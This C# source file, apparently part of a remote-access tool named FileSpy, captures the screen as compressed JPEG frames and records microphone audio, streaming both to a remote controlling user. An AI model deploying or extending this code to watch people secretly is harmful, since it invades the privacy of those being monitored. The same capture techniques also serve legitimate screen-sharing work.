using NAudio.Wave;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FileSpy.Classes
{
    class VideoClass
    {
        public int ID { get; set; }
        public int UserID { get; set; }

        bool Connected;
        DateTime LastTime;

        public bool VideoStream { get; set; }
        DateTime LastFPS;
        public int MaxFps { get; set; }
        public long Quality { get; set; }
        public int Size { get; set; }

        public WaveInEvent MicroInput { get; set; }
        public bool AudioStream { get; set; }

        public delegate void CloseHandler(VideoClass videoClass);
        public event CloseHandler CloseEvent;

        ConnectionClass Connection;

        public VideoClass(int id, int userId, ConnectionClass connection)
        {
            ID = id;
            UserID = userId;
            Connection = connection;

            Connected = true;
            VideoStream = true;
            MaxFps = 10;
            Quality = 50L;
            Size = 1;

            MicroInput = new WaveInEvent();
            MicroInput.WaveFormat = new WaveFormat(8000, 16, 1);
            MicroInput.DataAvailable += MicroInput_DataAvailable;
        }

        private void MicroInput_DataAvailable(object sender, WaveInEventArgs e)
        {
            Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.MicroData, ID, e.Buffer));
        }

        public void Start()
        {
            LastTime = DateTime.Now;
            Task.Run(Brander);
            Task.Run(VideoSender);
        }

        public void Pulsar()
        {
            LastTime = DateTime.Now;
        }

        private void VideoSender()
        {
            while (Connected)
            {
                if (VideoStream)
                {
                    LastFPS = DateTime.Now;

                    Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality)));

                    while ((DateTime.Now - LastFPS).TotalMilliseconds < 1000 / MaxFps)
                        Thread.Sleep(1);
                }
            }
        }

        private void Brander()
        {
            while (Connected)
            {
                try
                {
                    if ((DateTime.Now - LastTime).TotalSeconds > 10)
                        Close();
                    else
                        Thread.Sleep(1);
                }
                catch { }
            }
        }

        public void Close()
        {
            if (Connected)
            {
                Connected = false;
                CloseEvent(this);
            }
        }

        public static byte[] Zipper(byte[] bump)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                using (GZipStream zip = new GZipStream(stream, CompressionMode.Compress))
                {
                    zip.Write(bump, 0, bump.Length);
                }
                bump = stream.ToArray();
            }

            return bump;
        }

        public static byte[] TakeImageFrom(int size, long quality)
        {
            using (var ms = new MemoryStream())
            {
                using (var bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (var graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);

                        ImageCodecInfo jgpEncoder = GetEncoder(ImageFormat.Jpeg);

                        System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;

                        EncoderParameters myEncoderParameters = new EncoderParameters(1);

                        EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, quality);
                        myEncoderParameters.Param[0] = myEncoderParameter;

                        switch (size)
                        {
                            case 0:
                                ResizeOrigImg(bitmap, 640, 360).Save(ms, jgpEncoder, myEncoderParameters);
                                break;
                            case 1:
                                ResizeOrigImg(bitmap, 854, 480).Save(ms, jgpEncoder, myEncoderParameters);
                                break;
                            case 2:
                                ResizeOrigImg(bitmap, 1280, 720).Save(ms, jgpEncoder, myEncoderParameters);
                                break;
                        }

                        //bitmap.Save(ms, jgpEncoder, myEncoderParameters);
                        //bitmap.Save(ms, ImageFormat.Jpeg);
                        byte[] data = ms.ToArray();

                        return Zipper(data);
                    }
                }
            }
        }

        private static Image ResizeOrigImg(Image image, int nWidth, int nHeight)
        {
            int newWidth, newHeight;
            var coefH = (double)nHeight / (double)image.Height;
            var coefW = (double)nWidth / (double)image.Width;
            if (coefW >= coefH)
            {
                newHeight = (int)(image.Height * coefH);
                newWidth = (int)(image.Width * coefH);
            }
            else
            {
                newHeight = (int)(image.Height * coefW);
                newWidth = (int)(image.Width * coefW);
            }

            Image result = new Bitmap(newWidth, newHeight);
            using (var g = Graphics.FromImage(result))
            {
                g.CompositingQuality = CompositingQuality.HighSpeed;
                g.SmoothingMode = SmoothingMode.HighSpeed;
                g.InterpolationMode = InterpolationMode.Low;

                g.DrawImage(image, 0, 0, newWidth, newHeight);
                g.Dispose();
            }
            return result;
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {

            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
    }
}
